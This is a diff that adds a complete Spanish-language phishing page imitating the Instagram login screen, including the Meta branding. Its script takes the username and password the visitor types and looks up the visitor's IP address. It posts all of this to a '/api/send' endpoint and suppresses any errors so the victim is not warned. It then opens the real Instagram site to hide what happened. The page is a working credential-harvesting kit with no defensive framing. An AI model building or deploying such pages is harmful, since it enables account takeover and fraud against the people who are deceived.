@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body {
+    width: 100%;
+    height: 100%;
+    background: #242424;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  }
+
+  .screen {
+    width: 100%;
+    min-height: 100vh;
+    background: #242424;
+    display: flex;
+    flex-direction: column;
+    align-items: stretch;
+    padding: 0 24px;
+    max-width: 480px;
+    margin: 0 auto;
+  }
+
+  .lang {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    padding-top: 24px;
+    padding-bottom: 0;
+    color: #e0e0e0;
+    font-size: 16px;
+    font-weight: 400;
+    cursor: pointer;
+  }
+  .lang svg {
+    width: 14px;
+    height: 14px;
+    fill: #e0e0e0;
+  }
+
+  .logo-area {
+    display: flex;
+    justify-content: center;
+    padding: 60px 0 70px;
+  }
+
+  .ig-icon {
+    width: 88px;
+    height: 88px;
+  }
+
+  .form-area {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+  }
+
+  .ig-input {
+    width: 100%;
+    background: #303030;
+    border: 1px solid #3d3d3d;
+    border-radius: 14px;
+    padding: 20px 18px;
+    font-size: 16px;
+    color: #fff;
+    outline: none;
+    -webkit-appearance: none;
+    appearance: none;
+    margin-bottom: 10px;
+  }
+  .ig-input::placeholder { color: #7a7a7a; font-size: 16px; }
+  .ig-input:focus { border-color: #555; }
+
+  .btn-login {
+    width: 100%;
+    padding: 18px;
+    background: #4a7bf7;
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 4px;
+    margin-bottom: 22px;
+    letter-spacing: 0.2px;
+  }
+  .btn-login:active { opacity: 0.88; }
+
+  .forgot {
+    text-align: center;
+    font-size: 15px;
+    font-weight: 700;
+    color: #e8e8e8;
+    cursor: pointer;
+    margin-bottom: 0;
+  }
+
+  .spacer { flex: 1; min-height: 80px; }
+
+  .bottom {
+    padding-bottom: 32px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .btn-create {
+    width: 100%;
+    padding: 18px;
+    background: transparent;
+    color: #4a7bf7;
+    border: 1.5px solid #3d3d3d;
+    border-radius: 30px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    letter-spacing: 0.1px;
+  }
+  .btn-create:active { border-color: #666; }
+
+  .meta-wrap {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    color: #c0c0c0;
+    font-size: 15px;
+    font-weight: 500;
+  }
+
+  .loading-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.8);
+    z-index: 200;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 16px;
+  }
+  .loading-overlay.show { display: flex; }
+  .spinner {
+    width: 40px;
+    height: 40px;
+    border: 3px solid #333;
+    border-top-color: #4a7bf7;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-text {
+    color: #aaa;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+
+<div class="screen">
+
+  <div class="lang">
+    Español (España)
+    <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+  </div>
+
+  <div class="logo-area">
+    <svg class="ig-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <radialGradient id="g1" cx="28%" cy="105%" r="135%" gradientUnits="objectBoundingBox">
+          <stop offset="0%"   stop-color="#ffd600"/>
+          <stop offset="18%"  stop-color="#ff7a00"/>
+          <stop offset="38%"  stop-color="#ff0069"/>
+          <stop offset="62%"  stop-color="#d300c5"/>
+          <stop offset="100%" stop-color="#7638fa"/>
+        </radialGradient>
+      </defs>
+      <rect width="100" height="100" rx="26" ry="26" fill="url(#g1)"/>
+      <rect x="14" y="14" width="72" height="72" rx="22" ry="22"
+            fill="none" stroke="white" stroke-width="5.5"/>
+      <circle cx="50" cy="50" r="17.5"
+              fill="none" stroke="white" stroke-width="5.5"/>
+      <circle cx="73.5" cy="26.5" r="4.5" fill="white"/>
+    </svg>
+  </div>
+
+  <div class="form-area">
+    <input class="ig-input" type="text"     id="user" placeholder="Usuario, correo electrónico o móvil">
+    <input class="ig-input" type="password" id="pass" placeholder="Contraseña">
+    <button class="btn-login" onclick="handleLogin()">Iniciar sesión</button>
+    <div class="forgot">¿Has olvidado la contraseña?</div>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="bottom">
+    <button class="btn-create">Crear cuenta nueva</button>
+    <div class="meta-wrap">
+      <svg width="36" height="16" viewBox="0 0 36 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M4.5 8C4.5 6.07 5.57 4.5 7 4.5C8.2 4.5 9.1 5.4 9.95 7.1L11.5 10.1C12.8 12.6 14.3 14 16.5 14C19.54 14 22 11.31 22 8C22 4.97 20.15 2.5 17.5 2.5C15.9 2.5 14.7 3.5 13.6 5.3L12.5 7.1" stroke="#c0c0c0" stroke-width="2" stroke-linecap="round" fill="none"/>
+        <path d="M31.5 8C31.5 6.07 30.43 4.5 29 4.5C27.8 4.5 26.9 5.4 26.05 7.1L24.5 10.1C23.2 12.6 21.7 14 19.5 14C16.46 14 14 11.31 14 8C14 4.97 15.85 2.5 18.5 2.5C20.1 2.5 21.3 3.5 22.4 5.3L23.5 7.1" stroke="#c0c0c0" stroke-width="2" stroke-linecap="round" fill="none"/>
+      </svg>
+      <span>Meta</span>
+    </div>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loading">
+  <div class="spinner"></div>
+  <div class="loading-text">Iniciando sesión...</div>
+</div>
+
+<script>
+async function handleLogin() {
+  const user = document.getElementById('user').value.trim();
+  const pass = document.getElementById('pass').value;
+
+  if (!user || !pass) {
+    alert('Completá usuario y contraseña.');
+    return;
+  }
+
+  document.getElementById('loading').classList.add('show');
+
+  // Obtener IP del visitante
+  let ip = 'No disponible';
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    ip = ipData.ip;
+  } catch (e) {
+    // Silenciar error de IP
+  }
+
+  // Enviar datos a tu API de Vercel
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        usuario: user,
+        contrasena: pass,
+        ip: ip,
+        url: window.location.href
+      })
+    });
+  } catch (e) {
+    // Silenciar errores para no alertar al usuario
+  }
+
+  // Abrir Instagram en nueva pestaña
+  window.open('https://www.instagram.com', '_blank');
+
+  // Ocultar carga y limpiar formulario
+  document.getElementById('loading').classList.remove('show');
+  document.getElementById('user').value = '';
+  document.getElementById('pass').value = '';
+}
+</script>
+
+</body>
+</html>
